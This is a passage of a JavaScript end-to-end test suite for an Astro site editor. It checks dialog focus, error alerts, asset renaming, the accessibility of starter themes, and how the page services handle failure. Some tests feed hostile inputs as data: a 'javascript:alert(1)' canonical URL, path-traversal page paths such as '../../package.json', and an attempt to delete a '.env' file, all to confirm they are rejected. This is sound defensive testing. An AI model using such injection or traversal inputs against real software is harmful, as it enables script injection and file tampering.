        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A nav label that still matches the page title follows the title as it is
  // typed. A label the user has edited stays put, and the title field keeps
  // the keyboard.
  {
    let content = null;
    let actions = [];
    let reportedTitle = false;
    let reportedSave = false;
    let reportedCanonical = false;
    let metaWrites = 0;
    const finish = () => {
      if (content) content.remove();
      delete dom.window.zephus;
    };
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorPageModals.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const doc = dom.window.document;
      dom.window.zephus = {
        readPageMeta: async () => ({
          title: "About",
          slug: "about",
          navLabel: "About",
          metaDescription: "",
          navVisible: true,
          socialImage: "",
          canonicalUrl: "",
          noindex: false,
          publishDate: "",
          author: "",
          isHome: false,
          route: "/about",
          page: "src/pages/about.astro",
        }),
        readPageDocument: async () => ({ ok: false }),
        writePageMeta: async () => {
          metaWrites += 1;
          return { ok: false, error: "disk" };
        },
      };
      const pages = mod.exports.createPageModalActions({
        getState: () => ({
          project: { path: "C:/site", astro: { pagesDir: "src/pages" } },
          siteDocument: null,
          pendingSiteDocument: null,
        }),
        setStatus() {},
        closeModal() {},
        registerCleanup() {},
        refreshIcons() {},
        modalController: { confirmDestructive: async () => false },
        maybeResolveUnsavedWork: async () => true,
        reloadPages: async () => {},
        loadPage: async () => {},
        getCode: () => "",
        syncCurrentMeta() {},
        resetOpenPageState() {},
        normalizePageSlugInput: (value) => value,
        isReservedNotFoundSlug: (slug) =>
          slug === "404" || slug.startsWith("404/"),
        invalidateAssetCache() {},
        fetchAssetDataUrl: async () => null,
        reloadSiteDocumentFromDisk: async () => {},
        showModalNode(_title, node, nextActions) {
          content = node;
          actions = nextActions;
          doc.body.append(node);
        },
        editorSaveWaitForIdle: async () => {},
        editorSaveIsSaving: () => false,
        patchOpenPageLayoutTitle() {},
        pageDraftContent: () => "",
      });
      await pages.openPageMetaModal("src/pages/about.astro");
      const labeled = (name) => {
        const span = [...content.querySelectorAll("span")].find(
          (node) => (node.textContent || "").trim() === name,
        );
        return span ? span.parentElement.querySelector("input") : null;
      };
      const typeInto = (input, value) => {
        input.focus();
        input.value = value;
        input.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      };
      const title = labeled("Page title");
      typeInto(title, "About us");
      const nav = content.querySelector(".page-nav-label");
      const synced = nav.value === "About us" && doc.activeElement === title;
      typeInto(nav, "Custom");
      typeInto(title, "About us today");
      const customKept = nav.value === "Custom" && doc.activeElement === title;
      reportedTitle = true;
      record(
        "page title keeps a mirrored nav label in view",
        synced && customKept,
        `synced=${synced} custom=${customKept} nav=${nav && nav.value}`,
      );
      const save = actions.find((action) => action.label === "Save");
      await save.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const saveAlert = content.querySelector(".page-settings-error");
      const titleNow = content.querySelector(".page-title");
      const saveShown =
        !!saveAlert &&
        saveAlert.getAttribute("role") === "alert" &&
        saveAlert.textContent === "Metadata save failed: disk" &&
        doc.activeElement === titleNow;
      typeInto(titleNow, "Still about");
      const saveCleared =
        !content.querySelector(".page-settings-error") &&
        doc.activeElement === titleNow;
      reportedSave = true;
      record(
        "page settings failure stays in the dialog",
        saveShown && saveCleared,
        `shown=${saveShown} cleared=${saveCleared} alert=${saveAlert && saveAlert.textContent} active=${doc.activeElement && doc.activeElement.className}`,
      );
      const writesBeforeCanonical = metaWrites;
      const canonical = content.querySelector(".page-canonical");
      typeInto(canonical, "javascript:alert(1)");
      await save.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const canonicalAlert = content.querySelector(".page-settings-error");
      const canonicalNow = content.querySelector(".page-canonical");
      const canonicalShown =
        !!canonicalAlert &&
        canonicalAlert.getAttribute("role") === "alert" &&
        canonicalAlert.textContent === "That link type is not allowed." &&
        doc.activeElement === canonicalNow &&
        canonicalNow.value === "javascript:alert(1)" &&
        metaWrites === writesBeforeCanonical;
      typeInto(canonicalNow, "https://example.com/about");
      const canonicalCleared =
        !content.querySelector(".page-settings-error") &&
        doc.activeElement === canonicalNow;
      reportedCanonical = true;
      record(
        "page canonical refuses a script address",
        canonicalShown && canonicalCleared,
        `shown=${canonicalShown} cleared=${canonicalCleared} writes=${metaWrites} alert=${canonicalAlert && canonicalAlert.textContent}`,
      );
      finish();
      content = null;
    } catch (error) {
      finish();
      if (!reportedTitle) {
        record(
          "page title keeps a mirrored nav label in view",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedSave) {
        record(
          "page settings failure stays in the dialog",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedCanonical) {
        record(
          "page canonical refuses a script address",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
    }
  }

  // Create Page with an empty route used to do nothing while the dialog
  // stayed open. The route field has to say what is missing, and a route that
  // cannot be a slug has to stay in the dialog too.
  {
    let content = null;
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorNewPage.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const doc = dom.window.document;
      let actions = [];
      let creates = 0;
      let closed = false;
      const finish = () => {
        if (content) content.remove();
      };
      await mod.exports.openNewPageModal({
        getProject: () => ({
          path: "C:/site",
          astro: { pagesDir: "src/pages" },
        }),
        showModalNode(_title, node, nextActions) {
          content = node;
          actions = nextActions;
          doc.body.append(node);
        },
        closeModal() {
          closed = true;
        },
        registerCleanup() {},
        setStatus() {},
        createPage: async () => {
          creates += 1;
          return { ok: true };
        },
        reloadPages: async () => {},
        loadPage: async () => {},
        findCreatedPage: () => undefined,
      });
      const create = actions.find((action) => action.label === "Create Page");
      await create.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const emptyAlert = content.querySelector(".new-page-error");
      const route = content.querySelector(".page-route");
      const emptyShown =
        !!emptyAlert &&
        emptyAlert.getAttribute("role") === "alert" &&
        emptyAlert.textContent === "Enter a page route." &&
        doc.activeElement === route &&
        creates === 0 &&
        closed === false;
      route.focus();
      route.value = "???";
      route.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const emptyCleared = !content.querySelector(".new-page-error");
      await create.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const invalidAlert = content.querySelector(".new-page-error");
      const routeNow = content.querySelector(".page-route");
      const invalidShown =
        !!invalidAlert &&
        invalidAlert.textContent === "Invalid page slug." &&
        doc.activeElement === routeNow &&
        routeNow.value === "???" &&
        creates === 0 &&
        closed === false;
      routeNow.focus();
      routeNow.value = "about";
      routeNow.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const invalidCleared =
        !content.querySelector(".new-page-error") &&
        doc.activeElement === routeNow;
      await create.onClick();
      const created = creates === 1 && closed === true;
      finish();
      record(
        "new page explains an empty or unusable route",
        emptyShown && emptyCleared && invalidShown && invalidCleared && created,
        `empty=${emptyShown} cleared=${emptyCleared} invalid=${invalidShown} typed=${invalidCleared} created=${created} creates=${creates}`,
      );
    } catch (error) {
      if (content) content.remove();
      record(
        "new page explains an empty or unusable route",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Renaming or deleting an asset rebuilds the grid. The keyboard has to land
  // on the renamed file, and on a neighbor after a delete.
  {
    let content = null;
    let reportedTiles = false;
    let reportedFailure = false;
    const finish = () => {
      if (content) content.remove();
      delete dom.window.zephus;
    };
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorPageModals.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const doc = dom.window.document;
      let assets = [
        {
          category: "images",
          fileName: "a.png",
          size: 10,
          webPath: "/assets/images/a.png",
        },
        {
          category: "images",
          fileName: "b.png",
          size: 12,
          webPath: "/assets/images/b.png",
        },
      ];
      let failRename = false;
      dom.window.zephus = {
        listAssets: async () => ({ ok: true, assets }),
        findAssetUsage: async () => ({
          ok: true,
          pages: [],
          siteReferences: [],
        }),
        renameAsset: async (
          _project,
          _publicDir,
          _pages,
          webPath,
          nextName,
        ) => {
          if (failRename) return { ok: false, error: "disk" };
          const asset = assets.find((item) => item.webPath === webPath);
          const nextPath = `/assets/images/${nextName}.png`;
          if (asset) {
            asset.fileName = `${nextName}.png`;
            asset.webPath = nextPath;
          }
          return { ok: true, webPath: nextPath, updatedReferences: 0 };
        },
        deleteAsset: async (_project, _publicDir, webPath) => {
          assets = assets.filter((item) => item.webPath !== webPath);
          return { ok: true };
        },
        readPageMeta: async () => ({}),
        readPageDocument: async () => ({ ok: false }),
      };
      const pages = mod.exports.createPageModalActions({
        getState: () => ({
          project: {
            path: "C:/site",
            astro: { pagesDir: "src/pages", publicDir: "public" },
          },
          siteDocument: null,
          pendingSiteDocument: null,
          page: null,
          pageDirty: false,
          siteDirty: false,
        }),
        setStatus() {},
        closeModal() {},
        registerCleanup() {},
        refreshIcons() {},
        modalController: {
          confirmDestructive: async () => true,
          promptText: async () => "renamed",
        },
        maybeResolveUnsavedWork: async () => true,
        reloadPages: async () => {},
        loadPage: async () => {},
        getCode: () => "",
        syncCurrentMeta() {},
        resetOpenPageState() {},
        normalizePageSlugInput: (value) => value,
        isReservedNotFoundSlug: () => false,
        invalidateAssetCache() {},
        fetchAssetDataUrl: async () => null,
        reloadSiteDocumentFromDisk: async () => {},
        showModalNode(_title, node) {
          content = node;
          doc.body.append(node);
        },
        editorSaveWaitForIdle: async () => {},
        editorSaveIsSaving: () => false,
        patchOpenPageLayoutTitle() {},
        pageDraftContent: () => "",
      });
      const assetButton = (webPath, action) =>
        [...content.querySelectorAll("button")].find(
          (button) =>
            button.dataset.assetPath === webPath &&
            button.dataset.assetAction === action,
        );
      const settle = async () => {
        await new Promise((resolve) => setTimeout(resolve, 0));
        await new Promise((resolve) => setTimeout(resolve, 0));
      };
      pages.openAssetBrowser({ onSelect() {} });
      await settle();
      assetButton("/assets/images/b.png", "rename").click();
      await settle();
      const renamed = assetButton("/assets/images/renamed.png", "rename");
      const renameKept =
        doc.activeElement === renamed && renamed.tabIndex === 0;
      assetButton("/assets/images/renamed.png", "delete").click();
      await settle();
      const neighbor = assetButton("/assets/images/a.png", "delete");
      const deleteKept =
        !renamed.isConnected &&
        doc.activeElement === neighbor &&
        neighbor.tabIndex === 0;
      reportedTiles = true;
      record(
        "asset browser keeps a tile after rename or delete",
        renameKept && deleteKept,
        `rename=${renameKept} delete=${deleteKept} active=${doc.activeElement && doc.activeElement.getAttribute("data-asset-path")}`,
      );
      failRename = true;
      assetButton("/assets/images/a.png", "rename").click();
      await settle();
      const failedRename = assetButton("/assets/images/a.png", "rename");
      const failureAlert = content.querySelector(".asset-browser-error");
      const failureShown =
        !!failureAlert &&
        failureAlert.getAttribute("role") === "alert" &&
        failureAlert.textContent === "Rename failed: disk" &&
        doc.activeElement === failedRename;
      assetButton("/assets/images/a.png", "delete").click();
      await settle();
      const failureCleared = !content.querySelector(".asset-browser-error");
      reportedFailure = true;
      record(
        "asset rename failure stays in the dialog",
        failureShown && failureCleared,
        `shown=${failureShown} cleared=${failureCleared} alert=${failureAlert && failureAlert.textContent} active=${doc.activeElement && doc.activeElement.getAttribute("data-asset-action")}`,
      );
      finish();
      content = null;
    } catch (error) {
      finish();
      if (!reportedTiles) {
        record(
          "asset browser keeps a tile after rename or delete",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedFailure) {
        record(
          "asset rename failure stays in the dialog",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
    }
  }

  // The image focus control said "drag" and never showed the point. Arrow
  // keys already move it; the label and the readout have to say so.
  {
    try {
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "BlockProps", "imageGallery.tsx"),
        "utf8",
      );
      const start = source.indexOf("<span>Focus point</span>");
      const end = source.indexOf("export function GalleryContentGroup");
      const focus = start >= 0 && end > start ? source.slice(start, end) : "";
      record(
        "image focus point shows its position and arrow keys",
        start >= 0 &&
          !source.includes("Focus point (drag)") &&
          focus.includes("meta-hint") &&
          focus.includes("% across") &&
          focus.includes("arrow keys") &&
          focus.includes('event.key === "ArrowLeft"') &&
          focus.includes('event.key === "ArrowUp"') &&
          focus.includes('event.key === "ArrowDown"') &&
          focus.includes('onStyleChange("objectPosition"') &&
          focus.includes("Arrow keys move it."),
        start >= 0 ? "label and arrows present" : "missing",
      );
    } catch (error) {
      record(
        "image focus point shows its position and arrow keys",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }
}

/**
 * Every bundled starter theme must ship an accessible accent plus a managed
 * layout/CSS with keyboard-navigation safeguards. Uses the real theme/wizard/
 * schema services against temp sites, so this cannot pass by asserting on
 * product source strings alone.
 */
async function runStarterThemeA11yChecks(svc) {
  const hexToRgb = (value) => {
    const match = /^#([0-9a-f]{6})$/i.exec(String(value ?? "").trim());
    if (!match) return null;
    const n = parseInt(match[1], 16);
    return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
  };
  const channel = (v) => {
    const c = v / 255;
    return c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
  };
  const luminance = (rgb) =>
    0.2126 * channel(rgb[0]) +
    0.7152 * channel(rgb[1]) +
    0.0722 * channel(rgb[2]);
  const contrast = (a, b) => {
    const la = luminance(a);
    const lb = luminance(b);
    return (Math.max(la, lb) + 0.05) / (Math.min(la, lb) + 0.05);
  };
  const white = [255, 255, 255];
  const themeIds = svc.themes.listThemes().map((t) => t.id);
  const accentFailures = [];
  const outputFailures = [];
  let checked = 0;
  let lowest = { ratio: Infinity, detail: "" };

  for (const themeId of themeIds) {
    let tmp = null;
    try {
      const ctx = mkSite(svc, themeId);
      tmp = ctx.tmp;
      const { project } = ctx;

      // Stored design tokens come back through the schema service.
      const siteRead = svc.schema.readSiteDocument(project);
      if (!siteRead.ok || !siteRead.site) {
        accentFailures.push(
          `${themeId}: site.json unreadable (${siteRead.error ?? "no site"})`,
        );
      } else {
        checked += 1;
        const accent = siteRead.site.design.accent;
        const background = siteRead.site.design.background;
        const accentRgb = hexToRgb(accent);
        const backgroundRgb = hexToRgb(background);
        if (!accentRgb || !backgroundRgb) {
          accentFailures.push(
            `${themeId}: unparseable accent=${JSON.stringify(accent)} background=${JSON.stringify(background)}`,
          );
        } else {
          // White is always checked; the stored background is only a second
          // surface when it actually differs from white.
          const surfaces = [["#ffffff", white]];
          if (backgroundRgb.some((v, i) => v !== white[i])) {
            surfaces.push([background, backgroundRgb]);
          }
          for (const [label, bg] of surfaces) {
            const ratio = contrast(accentRgb, bg);
            if (ratio < lowest.ratio) {
              lowest = { ratio, detail: `${themeId} ${accent} on ${label}` };
            }
            if (ratio < 4.5) {
              accentFailures.push(
                `${themeId} ${accent} on ${label} ${ratio.toFixed(2)}:1`,
              );
            }
          }
        }
      }

      const layoutPath = path.join(
        project,
        "src",
        "layouts",
        "BaseLayout.astro",
      );
      const layout = fs.existsSync(layoutPath)
        ? fs.readFileSync(layoutPath, "utf8")
        : "";
      const skipTag =
        layout.match(
          /<a\b[^>]*\bclass="[^"]*\bzephus-skip-link\b[^"]*"[^>]*>/i,
        )?.[0] ?? "";
      const skipHref = skipTag.match(/\bhref="#([^"]+)"/i)?.[1] ?? "";
      const mainId = layout.match(/<main\b[^>]*\bid="([^"]+)"/i)?.[1] ?? "";
      const navTag =
        layout.match(
          /<nav\b[^>]*\bclass="[^"]*\bzephus-shell-nav\b[^"]*"[^>]*>/i,
        )?.[0] ?? "";
      const navName = navTag.match(/\baria-label="([^"]+)"/i)?.[1] ?? "";

      if (!skipTag) outputFailures.push(`${themeId}: no .zephus-skip-link`);
      if (!skipHref)
        outputFailures.push(`${themeId}: skip link has no #target`);
      if (!mainId) outputFailures.push(`${themeId}: <main> has no id target`);
      if (skipHref && mainId && skipHref !== mainId) {
        outputFailures.push(
          `${themeId}: skip #${skipHref} does not match main #${mainId}`,
        );
      }
      if (!navName.trim()) {
        outputFailures.push(`${themeId}: primary nav has no aria-label`);
      }

      const cssFiles = [
        ["global.css", path.join(project, "public", "styles", "global.css")],
        [
          "zephus-managed.css",
          path.join(project, "public", "styles", "zephus-managed.css"),
        ],
      ];
      for (const [name, file] of cssFiles) {
        const css = fs.existsSync(file) ? fs.readFileSync(file, "utf8") : "";
        if (!/\.zephus-skip-link\b/.test(css)) {
          outputFailures.push(`${themeId}: ${name} lacks skip-link styles`);
        }
        if (!/:focus-visible\b/.test(css)) {
          outputFailures.push(`${themeId}: ${name} lacks :focus-visible`);
        }
        if (!/@media\s*\(prefers-reduced-motion:\s*reduce\)/i.test(css)) {
          outputFailures.push(`${themeId}: ${name} lacks reduced-motion media`);
        }
        const reduced =
          css.match(
            /@media\s*\(prefers-reduced-motion:\s*reduce\)\s*\{[^}]*\}/i,
          )?.[0] ?? "";
        if (!/scroll-behavior\s*:\s*auto/i.test(reduced)) {
          outputFailures.push(
            `${themeId}: ${name} reduced-motion does not disable smooth scrolling`,
          );
        }
        const hover = css.match(/\.button:hover\s*\{[^}]*\}/i)?.[0] ?? "";
        if (!hover) {
          outputFailures.push(`${themeId}: ${name} lacks .button:hover`);
        } else {
          if (/\bopacity\s*:/.test(hover)) {
            outputFailures.push(
              `${themeId}: ${name} .button:hover uses opacity`,
            );
          }
          if (!/\bbackground\s*:/.test(hover)) {
            outputFailures.push(
              `${themeId}: ${name} .button:hover lacks darker background`,
            );
          }
        }
        if (
          !/\.button\.secondary:hover\s*\{[^}]*background\s*:\s*transparent/i.test(
            css,
          )
        ) {
          outputFailures.push(
            `${themeId}: ${name} secondary hover is not contrast-preserving`,
          );
        }
      }
    } catch (e) {
      const message = e && e.message ? e.message : String(e);
      accentFailures.push(`${themeId}: ${message}`);
      outputFailures.push(`${themeId}: ${message}`);
    } finally {
      if (tmp) rm(tmp);
    }
  }

  const summarize = (failures) =>
    `${failures.length} issue(s): ${failures.slice(0, 8).join("; ")}${
      failures.length > 8 ? " …" : ""
    }`;
  record(
    "starter theme accents >= 4.5:1 on white and stored background",
    accentFailures.length === 0 && checked === themeIds.length,
    accentFailures.length === 0 && checked === themeIds.length
      ? `${themeIds.length} themes, min ${lowest.ratio.toFixed(2)}:1 (${lowest.detail})`
      : summarize(accentFailures),
  );
  record(
    "managed starter output keyboard/reduced-motion safeguards",
    outputFailures.length === 0,
    outputFailures.length === 0
      ? `${themeIds.length} themes checked`
      : summarize(outputFailures),
  );
}

async function main() {
  ensureDraftsUserDataDir();
  const dist = (p) =>
    import(pathToFileURL(path.join(ROOT, "dist", "main", p)).href);
  const svc = {
    wizard: await dist("services/wizard.js"),
    schema: await dist("services/schema.js"),
    pageManager: await dist("services/pageManager.js"),
    drafts: await dist("services/drafts.js"),
    findReplace: await dist("services/findReplace.js"),
    themes: await dist("themes.js"),
  };
  const blockRender = await import(
    pathToFileURL(path.join(ROOT, "dist", "shared", "blockRender.js")).href
  );
  const allThemes = svc.themes.listThemes().map((t) => t.id);
  const themes = process.argv[2] === "--themes=all" ? allThemes : SMOKE_THEMES;
  console.log(`E2E failure suite: ${themes.join(", ")}`);

  for (const themeId of themes) {
    console.log(`\n[theme ${themeId}]`);
    let ctx;
    try {
      ctx = mkSite(svc, themeId);
    } catch (e) {
      record(`scaffold ${themeId}`, false, e.message);
      continue;
    }
    const { tmp, project, pagesDir } = ctx;
    const pagesRel = "src/pages";
    try {
      const page = firstPage(pagesDir);

      // Corrupt sidecar must not throw.
      if (page) {
        const slug = page.replace(/\.astro$/, "");
        const sidecar = path.join(project, ".zephus", "pages", `${slug}.json`);
        if (fs.existsSync(sidecar)) {
          const orig = fs.readFileSync(sidecar, "utf8");
          fs.writeFileSync(sidecar, JSON.stringify({ slug: "x" }), "utf8");
          let threw = false;
          try {
            svc.schema.readPageDocument(project, page, pagesRel);
          } catch (e) {
            threw = true;
            record("corrupt sidecar handled", false, `threw: ${e.message}`);
          }
          if (!threw) record("corrupt sidecar handled", true);
          fs.writeFileSync(sidecar, orig, "utf8");
        } else {
          record("corrupt sidecar handled", false, "no sidecar to corrupt");
        }
      }

      // Coerce non-string site fields.
      const siteFile = path.join(project, ".zephus", "site.json");
      if (fs.existsSync(siteFile)) {
        const orig = fs.readFileSync(siteFile, "utf8");
        try {
          const site = JSON.parse(orig);
          site.siteName = 42;
          if (site.shell) site.shell.navItems = "oops";
          fs.writeFileSync(siteFile, JSON.stringify(site), "utf8");
          const reread = svc.schema.readSiteDocument(project);
          const siteDoc = reread && reread.site;
          const nameOk = typeof siteDoc?.siteName === "string";
          const navOk = Array.isArray(siteDoc?.shell?.navItems);
          record(
            "non-string site fields coerced",
            reread?.ok === true && nameOk && navOk,
            `ok=${reread && reread.ok} siteName=${typeof siteDoc?.siteName} nav=${navOk ? "array" : typeof siteDoc?.shell?.navItems}`,
          );
        } catch (e) {
          record("non-string site fields coerced", false, e.message);
        }
        fs.writeFileSync(siteFile, orig, "utf8");
      }

      // Traversal rejected.
      let travRejected = false;
      try {
        const ren = svc.pageManager.renamePage(
          project,
          "../../package.json",
          pagesRel,
          "evil",
        );
        travRejected = !ren || ren.ok === false;
      } catch {
        travRejected = true;
      }
      record("traversal rejected", travRejected);

      const layoutPath = path.join(
        project,
        "src",
        "layouts",
        "BaseLayout.astro",
      );
      if (!fs.existsSync(layoutPath)) {
        record("dotdot page path cannot delete layout", false, "no layout");
      } else {
        const beforeLayout = fs.readFileSync(layoutPath);
        const dotdot = `${pagesRel}/../layouts/BaseLayout.astro`.replace(
          /\\/g,
          "/",
        );
        const delLayout = svc.pageManager.deletePage(project, dotdot, pagesRel);
        const layoutRemains = fs.existsSync(layoutPath);
        const afterLayout = layoutRemains ? fs.readFileSync(layoutPath) : null;
        record(
          "dotdot page path cannot delete layout",
          !!delLayout &&
            delLayout.ok === false &&
            layoutRemains &&
            !!afterLayout &&
            Buffer.compare(beforeLayout, afterLayout) === 0,
          `ok=${delLayout && delLayout.ok} exists=${layoutRemains}`,
        );
      }

      // Non-page files refused.
      const secret = path.join(project, ".env");
      fs.writeFileSync(secret, "SECRET=1", "utf8");
      const delSecret = svc.pageManager.deletePage(project, ".env", pagesRel);
      record(
        "delete refuses .env",
        (!delSecret || delSecret.ok === false) && fs.existsSync(secret),
        delSecret && delSecret.ok ? "delete allowed" : "ok",
      );
      fs.rmSync(secret, { force: true });

      const renameMissing = svc.pageManager.renamePage(
        project,
        "no-such-page-xyz.astro",
        pagesRel,
        "renamed-xyz.astro",
      );
      record(
        "rename missing page fails clean",
        !renameMissing || renameMissing.ok === false,
      );
      record(
        "no stray file after failed rename",
        !fs.existsSync(path.join(pagesDir, "renamed-xyz.astro")),
      );

      // Zero-edit save is byte-identical.
      if (page) {
        const pageFile = path.join(pagesDir, page);
        const doc = svc.schema.readPageDocument(project, page, pagesRel);
        if (doc && doc.ok !== false && doc.pageDocument) {
          const beforeBytes = fs.readFileSync(pageFile);
          const payload = doc.pageDocument;
          svc.schema.writePageDocument(project, pagesRel, payload);
          svc.schema.writePageDocument(project, pagesRel, payload);
          const afterBytes = fs.readFileSync(pageFile);
          record(
            "zero-edit save byte-identical",
            Buffer.compare(beforeBytes, afterBytes) === 0,
            Buffer.compare(beforeBytes, afterBytes) === 0
              ? "ok"
              : `before=${beforeBytes.length} after=${afterBytes.length}`,
          );
        } else {
          record("zero-edit save byte-identical", false, "unmanaged page");
        }
      }

      // Find/replace must run while the page is still managed (before detach).
      try {
        const probe = "ZEPHUS_FIND_PROBE_XYZ";
        const replaceWith = "ZEPHUS_FIND_REPLACED_ABC";
        if (page) {
          const doc = svc.schema.readPageDocument(project, page, pagesRel);
          if (doc.ok && doc.pageDocument) {
            const sec = doc.pageDocument.sections[0];
            const blk = sec?.children[0];
            if (blk) {
              const key =
                blk.type === "heading"
                  ? "text"
                  : typeof blk.props.text === "string"
                    ? "text"
                    : "title";
              blk.props[key] = `Prefix ${probe} suffix`;
            }
            svc.schema.writePageDocument(project, pagesRel, doc.pageDocument);
          }
        }
        const hits = svc.findReplace.searchPages(project, pagesRel, probe);
        const rep = svc.findReplace.replaceAllInPages(
          project,
          pagesRel,
          probe,
          replaceWith,
        );
        const afterDoc = page
          ? svc.schema.readPageDocument(project, page, pagesRel)
          : null;
        let found = false;
        if (afterDoc?.ok && afterDoc.pageDocument) {
          const walk = (nodes) => {
            for (const n of nodes) {
              const val = Object.values(n.props ?? {}).find(
                (v) => typeof v === "string" && v.includes(replaceWith),
              );
              if (val) found = true;
              if (n.children) walk(n.children);
            }
          };
          walk(afterDoc.pageDocument.sections);
        }
        record(
          "find/replace mutates searchable text",
          !!hits && hits.ok && !!rep && rep.ok && rep.replaced > 0 && found,
          `replaced=${rep && rep.replaced}`,
        );
      } catch (e) {
        record("find/replace mutates searchable text", false, e.message);
      }

      // Hand-authored bytes survive metadata write (detached page).
      if (page) {
        const marker = "ZEPHUS_HAND_AUTHORED_BYTES";
        const handSource = `---\nimport BaseLayout from "../../layouts/BaseLayout.astro";\n---\n<p>${marker}</p>\n`;
        const detached = svc.schema.detachPageDocument(
          project,
          page,
          pagesRel,
          handSource,
        );
        if (!detached.ok) {
          record(
            "hand-authored bytes preserved on metadata write",
            false,
            detached.error ?? "detach failed",
          );
        } else {
          const before = fs.readFileSync(path.join(pagesDir, page), "utf8");
          svc.pageManager.writePageMetadata(project, page, pagesRel, {
            title: "E2E Title Probe",
          });
          const after = fs.readFileSync(path.join(pagesDir, page), "utf8");
          record(
            "hand-authored bytes preserved on metadata write",
            before === after && before.includes(marker),
            before === after ? "ok" : "bytes changed",
          );
        }
      }

      // Draft round-trip with exact content.
      const dw = svc.drafts.writeDraft(project, "page", "e2e-page", "hello");
      const rd = svc.drafts.readDraft(project, "page", "e2e-page");
      const cl = svc.drafts.clearDraft(project, "page", "e2e-page");
      const rd2 = svc.drafts.readDraft(project, "page", "e2e-page");
      record("draft write", dw.ok === true, dw.error ?? "");
      record(
        "draft read returns hello",
        rd.ok && rd.draft && rd.draft.content === "hello",
        rd.draft ? rd.draft.content : (rd.error ?? "no draft"),
      );
      record("draft clear", cl.ok === true, cl.error ?? "");
      record(
        "draft cleared content",
        rd2.ok === true && rd2.draft == null,
        rd2.draft ? rd2.draft.content : "empty",
      );

      try {
        const ensured2 = svc.schema.ensureVisualSchema(project, pagesRel);
        record("re-ensure after mutation", !!ensured2 && ensured2.ok !== false);
      } catch (e) {
        record("re-ensure after mutation", false, e.message);
      }
    } finally {
      copyE2eProof(project, themeId);
      rm(tmp);
    }
  }

  console.log("\n[product regression checks]");
  await runProductChecks(svc, blockRender);

  console.log("\n[fresh quality pass checks]");
  await runFreshQualityPassChecks(svc, blockRender);

  console.log("\n[starter theme accessibility checks]");
  await runStarterThemeA11yChecks(svc);

  console.log("\n[web engine & parity audit checks]");
  await runWebEngineAndUiAuditChecks(svc, blockRender);

  console.log("\n[astro rebuild on mutated sites]");
  const ASTRO_ENTRY = path.join(
    ROOT,
    "node_modules",
    "astro",
    "bin",
    "astro.mjs",
  );
  const wizard = svc.wizard;
  const schema = svc.schema;
  for (const themeId of BUILD_THEMES) {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), `zephus-e2e-build-`));
    const project = path.join(tmp, "site");
    fs.mkdirSync(project, { recursive: true });
    try {
      const created = wizard.createSite(project, themeId);
      if (!created.ok) throw new Error(created.error);
      try {
        fs.symlinkSync(
          path.join(ROOT, "node_modules"),
          path.join(project, "node_modules"),
          "dir",
        );
      } catch {
        /* already linked */
      }
      const ensured = schema.ensureVisualSchema(project, "src/pages");
      if (!ensured.ok) throw new Error(ensured.error ?? "ensure failed");
      const made = schema.createSchemaPage(project, "src/pages", "e2e-probe");
